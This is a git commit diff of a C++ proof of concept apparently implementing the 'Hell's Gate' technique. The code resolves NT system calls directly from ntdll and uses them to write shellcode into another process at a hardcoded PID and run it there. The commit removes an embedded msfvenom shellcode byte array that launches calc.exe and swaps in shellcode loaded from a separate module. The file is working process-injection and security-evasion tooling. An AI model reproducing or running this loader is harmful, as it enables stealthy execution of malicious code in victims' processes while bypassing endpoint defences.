ed65ca157143c3200871231a879fbea51cb6f068
Brian <brian_chamberlain@ao.uscourts.gov>
2020-09-17 15:41:48 -0400

    new sc

--- HellsGatePoC/HellsGatePoC/HellsGatePoC.cpp
+++ HellsGatePoC/HellsGatePoC/HellsGatePoC.cpp
@@ -1,34 +1,22 @@
-#include <iostream>
-#include <Windows.h>
 
+
+#include <Windows.h>
+#include <iostream>
+#include <vector>
+#include <tuple>
+
+#include "Utils.h"
 #include "structs.h"
+#include "SC.h"
 
 #define STATUS_SUCCESS 0
+using namespace std;
 
+vector<BYTE> sc = SC::GetSC();
 int const SYSCALL_STUB_SIZE = 23;
-
-
-//msfvenom - a x64 --platform windows - p windows / x64 / exec cmd = calc.exe EXITFUNC = thread
-unsigned char buf[] =
-"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
-"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
-"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
-"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
-"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
-"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
-"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
-"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
-"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
-"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
-"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
-"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
-"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
-"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
-"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
-"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
-"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
-"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
-"\x63\x2e\x65\x78\x65\x00";
+tuple<BYTE*, DWORD> snarf = Convert::VectorToByteArray(sc);
+BYTE* shellcode = get<0>(snarf);
+DWORD dwShellcodeLength = get<1>(snarf);
 
 
 MyNtOpenProcess _NtOpenProcess = NULL;
@@ -178,7 +166,7 @@ BOOL EstablishSyscalls()
 	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = NULL;
 	for (pListEntry; pListEntry != NULL; pListEntry = pListEntry->Flink)
 	{
-		pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pListEntry - 0x10) ;
+		pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pListEntry - 0x10);
 		auto name = pLdrDataEntry->BaseDllName;
 		//Make sure it is ntdll
 		if (_wcsnicmp(name.Buffer, L"ntdll.dll", 10) == 0)
@@ -237,7 +225,7 @@ int main(int argc, char* argv[])
 	HANDLE hProc = INVALID_HANDLE_VALUE;
 	HANDLE hRemoteThread = INVALID_HANDLE_VALUE;
 	LPVOID lpAllocationStart = nullptr;
-	SIZE_T szAllocation = sizeof buf;
+	SIZE_T szAllocation = dwShellcodeLength;
 	DWORD oldProtect;
 
 	/*
@@ -252,7 +240,7 @@ int main(int argc, char* argv[])
 		return 1;
 
 	//DWORD targetPid = std::atoi(argv[1]);
-	DWORD targetPid = 7032;
+	DWORD targetPid = 16016;
 	BOOL localNtDll = TRUE;
 
 
@@ -273,7 +261,7 @@ int main(int argc, char* argv[])
 	}
 
 	printf("Writing shellcode to 0x%p\n", lpAllocationStart);
-	status = _NtWriteVirtualMemory(hProc, lpAllocationStart, (PVOID)buf, sizeof buf, NULL);
+	status = _NtWriteVirtualMemory(hProc, lpAllocationStart, (PVOID)shellcode, dwShellcodeLength, NULL);
 	if (status != STATUS_SUCCESS)
 	{
 		printf("Failed to write to allocated memory\n");
@@ -308,4 +296,3 @@ int main(int argc, char* argv[])
 	printf("Success!");
 	return 0;
 }
-
